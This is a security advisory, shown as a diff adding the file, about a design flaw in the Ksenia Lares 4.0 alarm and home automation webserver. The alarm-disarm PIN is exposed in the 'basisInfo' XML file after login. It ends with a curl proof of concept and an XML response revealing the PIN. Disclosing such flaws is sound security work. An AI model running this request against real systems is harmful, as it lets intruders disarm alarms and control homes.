@@ -1,0 +1,49 @@
+
+Ksenia Security Lares 4.0 Home Automation PIN Logic Flaw
+
+
+Vendor: Ksenia Security S.p.A.
+Product web page: https://www.kseniasecurity.com
+Affected version: Firmware version 1.6
+                  Webserver version 1.0.0.15
+
+Summary: Lares is a burglar alarm & home automation system that can
+be controlled by means of an ergo LCD keyboard, as well as remotely
+by telephone, and even via the Internet through a built-in WEB server.
+
+Desc: The Ksenia home automation and burglar alarm system has a security
+flaw where the PIN required to disable the alarm is exposed in the 'basisInfo'
+XML file after initial authentication, allowing attackers who gain access
+to this file to bypass security measures. This design flaw enables unauthorized
+individuals to both disable the alarm system and manipulate smart home devices
+by simply retrieving the PIN from the server response, effectively rendering
+the security system useless since the supposedly secret PIN is easily obtainable
+once an attacker reaches the authenticated state. The system should never expose
+sensitive codes in API responses and should implement proper multi-factor
+authentication for critical functions like alarm deactivation.
+
+Tested on: Ksenia Lares Webserver
+
+
+Vulnerability discovered by Mencha `ShadeLock` Isajlovska
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5929
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5929.php
+
+
+03.07.2024
+
+--
+
+
+$ curl http://192.168.1.2/xml/info/basisInfo.xml
+
+This XML file does not appear to have any style information associated with it. The document tree is shown below.
+<basisInfo>
+<askPIN>1</askPIN>
+<PINToUse>147258</PINToUse>
+<PINTimeout>30</PINTimeout>
+<startFromMap>0</startFromMap>
+</basisInfo>
